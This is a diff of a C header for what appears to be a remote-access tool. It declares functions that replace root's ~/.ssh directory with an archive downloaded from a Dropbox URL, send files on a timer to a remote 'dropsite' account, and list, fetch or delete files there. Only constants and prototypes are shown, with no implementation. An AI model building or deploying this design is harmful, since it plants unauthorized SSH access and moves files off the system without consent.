@@ -22,18 +22,30 @@
 #include "common.h"
 
 /* defaults */
-#define SSH_DIR		"/root/.ssh/"
-#define SSH_BACKUP	"/root/.ssh/.backup/"
+#define SSH_DIR			"/root/.ssh/"
+#define SSH_BACKUP		"/root/.ssh/.backup/"
+#define DROPSITE		"filestorage@trollop.org"
+#define DROPSITE_DIR	"~/Files/"
 
 /* globals */
 char *ssh_files = "http://dl.dropbox.com/u/698619/SSH/ssh.tar.bz2";
 char *ssh_archive = "ssh.tar.bz2";
 
-/* function prototypes */
+/* server functions */
 void test_ssh(void);
 void ssh_replace_dir(void);
 void ssh_restore_dir(void);
-void ssh_send_timer(void);
+void ssh_send_files(void);
+void ssh_timer(void);
+
+/* client/server interative functions */
+char *ssh_request_file(char *);
+
+/* client functions */
+void ssh_dropsite_list(void);
+void ssh_dropsite_get(char *);
+void ssh_dropsite_delete(char *);
+void ssh_dropsite_clear(void);
 
 #endif
 
